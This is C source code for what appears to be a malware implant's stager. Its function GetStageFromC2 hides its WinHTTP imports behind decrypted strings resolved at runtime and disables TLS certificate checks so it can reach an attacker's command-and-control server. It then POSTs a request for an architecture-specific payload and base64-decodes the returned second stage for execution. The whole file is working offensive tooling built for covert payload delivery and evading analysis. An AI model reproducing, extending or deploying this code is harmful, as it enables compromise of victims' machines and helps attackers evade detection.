#include <windows.h>
#include <winhttp.h>

#include "settings.h"
#include "imports.h"
#include "strings.h"

#define _CALLBACK_URL L"/stage"
#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
#define _HEADER_LEN -1

CHAR* GetStageFromC2(DWORD* sSize)
{
    DWORD Flags;
    char* payload;
    DWORD bResults;
    DWORD dwSize = 0;
    LPSTR pszOutBuffer;
    DWORD dwDownloaded = 0;
    LPCWSTR* ResBuffer = "";
    HINTERNET hSession, hConnect, hRequest = NULL;

    // these are our flags for the connection, cause i doubt the c2 will have a legit cert
    Flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | \
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID | \
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    // get out close handle export
    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                              decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY));

    // init the connection
    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                         decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY));

    hSession = rWinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
    {
        return NULL;
    }

    // make the connection
    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                  decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY));

    hConnect = rWinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
    if (!hConnect)
    {
        rWinHttpCloseHandle(hSession);

        return NULL;
    }

    // setup our request
    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                              decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY));

    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
    if (!hRequest)
    {
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        return NULL;
    }

    // let us connect with bad ssl certs
    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                        decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY));

    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
    {
        rWinHttpCloseHandle(hRequest);
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        return NULL;
    }

    #ifdef SECURE
    if (sizeof(void*) == 8)
    {
        payload = "payload=x64/windows/secure/static";
    } else if (sizeof(void*) == 4)
    {
        payload = "payload=x86/windows/secure/static";
    }
    #endif

    #ifndef SECURE
        if (sizeof(void*) == 8)
        {
            payload = "payload=x64/windows/static";
        } else if (sizeof(void*) == 4)
        {
            payload = "payload=x86/windows/static";
        }
    #endif

    // make the request
    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                              decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY));

    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);

    if (bResults)
    {
        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                                              decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY));

        bResults = rWinHttpReceiveResponse(hRequest, NULL);

        do
        {
            // check how much available data there is
            dwSize = 0;
            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                                                           decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY));

            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                break;
            }

            // out of data
            if (!dwSize)
            {
                break;
            }

            // allocate space for the buffer
            pszOutBuffer = (LPSTR)malloc(dwSize+1);
            if (!pszOutBuffer)
            {
                DEBUG("Out of memory\n");
                break;
            }

            // read all the data
            ZeroMemory(pszOutBuffer, dwSize + 1);

            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                             decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY));

            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                break;
            }
            else
            {
                asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
            }

            // free the memory
            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    // setup our base64 decode
    size_t out_len   = strlen(ResBuffer) + 1;
    size_t b64_len   = b64_decoded_size(ResBuffer);
    char*  b64_out   = (char*)malloc(out_len);

    // decode the data
    b64_out = base64_decode((const char*)ResBuffer, out_len - 1, &out_len);

    // give the values back
    *sSize = b64_len;

    // clean up the handles
    rWinHttpCloseHandle(hRequest);
    rWinHttpCloseHandle(hSession);
    rWinHttpCloseHandle(hConnect);

    return b64_out;

}